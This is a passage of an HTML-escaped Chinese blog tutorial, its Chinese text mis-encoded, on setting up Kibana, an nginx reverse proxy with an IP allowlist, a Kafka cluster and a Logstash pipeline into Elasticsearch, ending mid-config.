class=&quot;comment&quot;&gt;# The host to bind the server to.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;server.host: &lt;span class=&quot;string&quot;&gt;&quot;10.47.88.188&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# If you are running kibana behind a proxy, and want to mount it at a path,&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# specify that path here. The basePath can&#39;t end in a slash.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# server.basePath: &quot;&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# The maximum payload size in bytes on incoming server requests.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# server.maxPayloadBytes: 1048576&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# The Elasticsearch instance to use for all your queries.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;elasticsearch.url: &lt;span class=&quot;string&quot;&gt;&quot;http://10.47.88.188:9200&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# preserve_elasticsearch_host true will send the hostname specified in `elasticsearch`. If you set it to false,&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# then the host you use to connect to *this* Kibana instance will be sent.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;elasticsearch.preserveHost: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Kibana uses an index in Elasticsearch to store saved searches, visualizations&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# and dashboards. It will create a new index if it doesn&#39;t already exist.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# kibana.index: &quot;.kibana&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# The default application to load.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;kibana.defaultAppId: &lt;span class=&quot;string&quot;&gt;&quot;discover&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# If your Elasticsearch is protected with basic auth, these are the user credentials&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# used by the Kibana server to perform maintenance on the kibana_index at startup. Your Kibana&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# users will still need to authenticate with Elasticsearch (which is proxied through&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# the Kibana server)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# elasticsearch.ssl.key: /path/to/your/client.key&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# If you need to provide a CA certificate for your Elasticsearch instance, put&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# the path of the pem file here.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# elasticsearch.ssl.ca: /path/to/your/CA.pem&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Set to false to have a complete disregard for the validity of the SSL&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# certificate.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# elasticsearch.ssl.verify: true&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Time in milliseconds to wait for elasticsearch to respond to pings, defaults to&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# request_timeout setting&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# elasticsearch.pingTimeout: 1500&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Time in milliseconds to wait for responses from the back end or elasticsearch.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# This must be &amp;gt; 0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;elasticsearch.requestTimeout: 30000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Time in milliseconds for Elasticsearch to wait for responses from shards.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Set to 0 to disable.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# elasticsearch.shardTimeout: 0&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;å¯åŠ¨kibanaæœåŠ¡&quot;&gt;&lt;a href=&quot;#å¯åŠ¨kibanaæœåŠ¡&quot; class=&quot;headerlink&quot; title=&quot;å¯åŠ¨kibanaæœåŠ¡&quot;&gt;&lt;/a&gt;å¯åŠ¨kibanaæœåŠ¡&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;service kibana start&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;service kibana status&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;æŸ¥çœ‹ç«¯å£&quot;&gt;&lt;a href=&quot;#æŸ¥çœ‹ç«¯å£&quot; class=&quot;headerlink&quot; title=&quot;æŸ¥çœ‹ç«¯å£&quot;&gt;&lt;/a&gt;æŸ¥çœ‹ç«¯å£&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;netstat -nltp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_02 config]&lt;span class=&quot;comment&quot;&gt;# netstat -nltp&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Active Internet connections (only servers)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 127.0.0.1:32000             0.0.0.0:*                   LISTEN      2517/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 10.47.88.188:5601           0.0.0.0:*                   LISTEN      6474/node&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 10.47.88.188:10050          0.0.0.0:*                   LISTEN      305/zabbix_agentd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 10.47.88.188:9200           0.0.0.0:*                   LISTEN      5198/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 10.47.88.188:9300           0.0.0.0:*                   LISTEN      5198/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 0.0.0.0:22                  0.0.0.0:*                   LISTEN      25265/sshd&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;åˆ°æˆ‘Githubä¸Šé¢ä¸‹è½½kabanaå¯åŠ¨è„šæœ¬ã€‚&lt;/p&gt;
&lt;p&gt;es_01æœºå™¨ä»es_02æœºå™¨æ‹·è´è¿‡å»ä¿®æ”¹ä¸‹é…ç½®å°±å¯ä»¥ã€‚ &lt;/p&gt;
&lt;h3 id=&quot;kibanaå®‰è£…æ’ä»¶å‚è€ƒï¼š&quot;&gt;&lt;a href=&quot;#kibanaå®‰è£…æ’ä»¶å‚è€ƒï¼š&quot; class=&quot;headerlink&quot; title=&quot;kibanaå®‰è£…æ’ä»¶å‚è€ƒï¼š&quot;&gt;&lt;/a&gt;kibanaå®‰è£…æ’ä»¶å‚è€ƒï¼š&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://www.elastic.co/guide/en/marvel/current/installing-marvel.html#installing-marvel&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Installing Marvel&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œkibanaæˆ‘åšäº†nginxåå‘ä»£ç†ï¼Œé›†ç¾¤ä»£ç†ã€‚&lt;/p&gt;
&lt;h3 id=&quot;nginxé…ç½®kibanaåå‘ä»£ç†ï¼š&quot;&gt;&lt;a href=&quot;#nginxé…ç½®kibanaåå‘ä»£ç†ï¼š&quot; class=&quot;headerlink&quot; title=&quot;nginxé…ç½®kibanaåå‘ä»£ç†ï¼š&quot;&gt;&lt;/a&gt;nginxé…ç½®kibanaåå‘ä»£ç†ï¼š&lt;/h3&gt;&lt;p&gt;è¿™é‡Œæˆ‘åªå…è®¸æˆ‘å…¬å¸IPè®¿é—®ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;  upstream kibana.ihaozhuo.com &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        server 10.47.88.206:5601 weight=1;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        server 10.47.88.188:5601 weight=1;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  server &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        listen       80;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        server_name  kibana.ihaozhuo.com;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        location / &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             index        index.html index.php index.jsp index.htm;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             allow 202.107.202.82/32;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             deny all;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             proxy_pass           http://kibana.ihaozhuo.com;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             proxy_ignore_client_abort on;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             proxy_redirect               off;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             proxy_set_header     Host    &lt;span class=&quot;variable&quot;&gt;$host&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             proxy_set_header     X-Real-IP       &lt;span class=&quot;variable&quot;&gt;$remote_addr&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             proxy_set_header     X-Forwarded-For &lt;span class=&quot;variable&quot;&gt;$proxy_add_x_forwarded_for&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;KafKaé›†ç¾¤æ­å»º&quot;&gt;&lt;a href=&quot;#KafKaé›†ç¾¤æ­å»º&quot; class=&quot;headerlink&quot; title=&quot;KafKaé›†ç¾¤æ­å»º&quot;&gt;&lt;/a&gt;KafKaé›†ç¾¤æ­å»º&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ä¸‹è½½åœ°å€ï¼šhttp://mirrors.hust.edu.cn/apache/kafka/0.9.0.0/kafka_2.10-0.9.0.0.tgz&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@kafka_01 srv]&lt;span class=&quot;comment&quot;&gt;# tar -xvf kafka_2.10-0.9.0.0.tgz&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@kafka_01 srv]&lt;span class=&quot;comment&quot;&gt;# mv kafka_2.10-0.9.0.0 kafka&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;ä¿®æ”¹kafkaé…ç½®æ–‡ä»¶ï¼š&quot;&gt;&lt;a href=&quot;#ä¿®æ”¹kafkaé…ç½®æ–‡ä»¶ï¼š&quot; class=&quot;headerlink&quot; title=&quot;ä¿®æ”¹kafkaé…ç½®æ–‡ä»¶ï¼š&quot;&gt;&lt;/a&gt;ä¿®æ”¹kafkaé…ç½®æ–‡ä»¶ï¼š&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@kafka_01 config]&lt;span class=&quot;comment&quot;&gt;# vim /srv/kafka/config/server.properties&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#è®¾ç½®brokeridï¼ˆä»0å¼€å§‹ï¼Œ3ä¸ªèŠ‚ç‚¹åˆ†åˆ«è®¾ä¸º0,1,2ï¼Œä¸èƒ½é‡å¤ï¼‰åœ¨è¿™é‡Œid=0è·Ÿzookeeper idè®¾ç½®ä¸€æ ·å°±è¡Œã€‚ é›†ç¾¤æœºå™¨ï¼šæŒ‰é¡ºåºå†™1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;broker.id=0  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#è®¾ç½®dataç›®å½•ï¼Œæœ€å¥½ä¸è¦ç”¨é»˜è®¤çš„/tmp/kafka-logs&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;mkdir -p /srv/kafka/data/kafka-logs&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#ä¿®æ”¹æœ¬åœ°IPåœ°å€ï¼š&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;listeners=PLAINTEXT://10.46.72.172:9092&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#è®¾ç½®æ³¨å†Œåœ°å€ï¼ˆé‡è¦ï¼Œé»˜è®¤ä¼šæŠŠæœ¬æœºçš„hostanmeæ³¨å†Œåˆ°zkä¸­ï¼Œå®¢æˆ·ç«¯è¿æ¥æ—¶éœ€è¦è§£æè¯¥hostanmeï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥æ³¨å†Œæœ¬æœºçš„IPåœ°å€ï¼Œé¿å…hostnameè§£æå¤±è´¥ï¼ŒæŠ¥é”™java.nio.channels.UnresolvedAddressExceptionæˆ–java.io.IOException: Can not resolve addressï¼‰&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#è®¾ç½®zookeeperåœ°å€&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;zookeeper.connect=10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;Kafkaç¾¤é›†æ–°å»ºä¸€ä¸ªTopic&quot;&gt;&lt;a href=&quot;#Kafkaç¾¤é›†æ–°å»ºä¸€ä¸ªTopic&quot; class=&quot;headerlink&quot; title=&quot;Kafkaç¾¤é›†æ–°å»ºä¸€ä¸ªTopic&quot;&gt;&lt;/a&gt;Kafkaç¾¤é›†æ–°å»ºä¸€ä¸ªTopic&lt;/h3&gt;&lt;p&gt;å«åšlogstash  Topic&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#æŸ¥çœ‹tocpicåˆ—è¡¨ï¼ˆ--zookeeperæŒ‡å®šä»»æ„ä¸€ä¸ªzkèŠ‚ç‚¹å³å¯ï¼Œç”¨äºè·å–é›†ç¾¤ä¿¡æ¯ï¼‰&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/kafka/bin/kafka-topics.sh --zookeeper zk1.yazuoyw.com:2181 --describe&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#åˆ›å»ºtopicï¼ˆ--replication-factorè¡¨ç¤ºå¤åˆ¶åˆ°å¤šå°‘ä¸ªèŠ‚ç‚¹ï¼Œ--partitionsè¡¨ç¤ºåˆ†åŒºæ•°ï¼Œä¸€èˆ¬éƒ½è®¾ç½®ä¸º2æˆ–ä¸èŠ‚ç‚¹æ•°ç›¸ç­‰ï¼Œä¸èƒ½å¤§äºæ€»èŠ‚ç‚¹æ•°ï¼‰&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/kafka/bin/kafka-topics.sh --zookeeper zk1.yazuoyw.com:2181 --create --topic topic1 --replication-factor 2 --partitions 2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#å‘é€æ¶ˆæ¯ï¼ˆ--topic æŒ‡å®štopicï¼‰&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/kafka/bin/kafka-console-producer.sh --broker-list kafka1.yazuoyw.com:9092,kafka2.yazuoyw.com:9092,kafka3.yazuoyw.com:9092 --topic topic1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;message1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;message2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#æ¶ˆè´¹æ¶ˆæ¯&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/kafka/bin/kafka-console-consumer.sh --zookeeper zk1.yazuoyw.com:2181 --topic topic1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#replicaæ£€æŸ¥&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/kafka/bin/kafka-replica-verification.sh --broker-list kafka1.yazuoyw.com:9092,kafka2.yazuoyw.com:9092,kafka3.yazuoyw.com:9092&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æ¯æ¡å‘å¸ƒåˆ°Kafkaé›†ç¾¤çš„æ¶ˆæ¯éƒ½æœ‰ä¸€ä¸ªç±»åˆ«ï¼Œè¿™ä¸ªç±»åˆ«è¢«ç§°ä¸ºtopicã€‚ï¼ˆç‰©ç†ä¸Šä¸åŒtopicçš„æ¶ˆæ¯åˆ†å¼€å­˜å‚¨ï¼Œé€»è¾‘ä¸Šä¸€ä¸ªtopicçš„æ¶ˆæ¯è™½ç„¶ä¿å­˜äºä¸€ä¸ªæˆ–å¤šä¸ªbrokerä¸Šä½†ç”¨æˆ·åªéœ€æŒ‡å®šæ¶ˆæ¯çš„topicå³å¯ç”Ÿäº§æˆ–æ¶ˆè´¹æ•°æ®è€Œä¸å¿…å…³å¿ƒæ•°æ®å­˜äºä½•å¤„ï¼‰&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ElasticSearch&lt;/code&gt;æœºå™¨&lt;code&gt;logstash&lt;/code&gt;æŠŠæ•°æ®ä»&lt;code&gt;kafka&lt;/code&gt;å­˜åˆ°&lt;code&gt;elasticsearch&lt;/code&gt;çš„é…ç½®&lt;/p&gt;
&lt;p&gt;å…¶ä¸­é€‰å–kafkaç¾¤é›†ä»»æ„ä¸€ä¸ªæœ‰zkçš„ipåšè¿æ¥ä½¿ç”¨&lt;/p&gt;
&lt;p&gt;&lt;code&gt;topic_id&lt;/code&gt;å°±æ˜¯kafkaä¸­è®¾ç½®çš„&lt;code&gt;topic logstash&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;åœ¨esä¸Šé¢å®‰è£…logstashé…ç½®&lt;br&gt;/usr/local/logstash/config/kafka_to_es.conf&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt; input &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    kafka 